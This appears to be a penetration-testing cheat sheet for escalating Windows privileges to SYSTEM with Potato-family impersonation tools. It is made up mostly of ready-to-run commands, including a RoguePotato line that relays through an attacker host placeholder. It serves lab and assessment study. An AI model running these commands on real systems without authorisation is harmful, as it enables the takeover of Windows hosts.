## Check a compatible EFS impersonation path

**Run in:** Windows PowerShell. **Requires:** The intended EfsPotato implementation, required impersonation privilege and reachable local EFSRPC/service behavior.

```powershell
.\EfsPotato.exe "cmd /c whoami"
```

**What the result establishes:** Validate the EFS/RPC and token conditions for the installed implementation and target build.

**Next check:** Read the actual RPC and token errors and compare host/build support; a running executable is not a completed escalation.

## A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)

**Notebook example**

```cmd
:: PrintSpoofer (uses the print spooler / RPC)
.\PrintSpoofer64.exe -i -c cmd.exe
:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
:: alternatives if those are blocked:
.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
.\EfsPotato.exe "cmd /c whoami"
```
